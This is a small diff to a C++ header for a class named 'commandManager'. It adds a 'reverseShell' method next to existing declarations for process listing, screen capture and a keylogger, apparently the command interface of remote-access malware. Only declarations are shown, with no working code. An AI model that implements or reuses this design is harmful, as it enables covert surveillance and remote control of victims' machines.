@@ -5,6 +5,7 @@ class commandManager
 
 public:
 	commandManager();
+	std::string reverseShell(const char* cmd);
 	void getProcess();
 	bool getScreen(LPCSTR fname);
 	void keyLogger();
